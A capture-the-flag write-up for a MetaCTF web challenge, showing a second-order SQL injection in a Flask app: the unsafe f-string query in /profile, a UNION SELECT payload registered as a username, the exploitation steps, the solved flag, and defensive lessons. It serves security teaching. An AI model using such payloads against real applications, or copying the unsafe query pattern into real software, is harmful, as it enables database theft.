# 🏴 MetaCTF Writeup: Second-Order SQL Injection  
**Challenge:** Web – Source Code Provided  
**Flag:** `MetaCTF{Ill_h4v3_7h47_s3c0nd_0rd3r_0f_SQLi_pl3453}`

---

## 🔍 Initial Recon

The challenge provided:
- A Flask web application with routes: `/register`, `/login`, `/profile`
- SQL schema via `init.db`
- Source code showed login and registration used **parameterized queries**

---

## 👀 Code Review

The login and registration were protected against SQL injection:

```python
cursor.execute("INSERT INTO users (username, password, salt) VALUES (%s, %s, %s)", ...)
cursor.execute("SELECT password, salt FROM users WHERE username=%s", ...)
```

But `/profile` had a raw f-string based query using `session['username']`:

```python
query = f"SELECT username, created_at FROM users WHERE username='{username}'"
```

## 🧠 Second-Order Injection Realization

- Direct SQLi via login/register is blocked ✅
    
- But we can **register with a malicious username**, which:
    
    - Gets stored in the DB
        
    - Is loaded into the session on login
        
    - Is later used unsafely in `/profile` 🔥
        

➡️ **Second-order SQL injection** – injection occurs during _read_ rather than _write_.

## 💥 Exploitation

### ✅ Payload for `username` field during registration:

```SQL
' UNION SELECT flag, NOW() FROM flags --
```



Steps:

    Register using that as your username

    Login with the same creds

    Visit /profile

The query becomes:

```sql
SELECT username, created_at FROM users WHERE username='' UNION SELECT flag, NOW() FROM flags -- '
```


# Flag:

```text
MetaCTF{Ill_h4v3_7h47_s3c0nd_0rd3r_0f_SQLi_pl3453}
```

## 🔐 Lessons Learned

- **Second-order SQLi** happens when data is saved _safe_ but used _unsafely later_
    
- Always **parameterize queries**, even when using session values
    
- Don’t trust input _even if it came from your own database_
    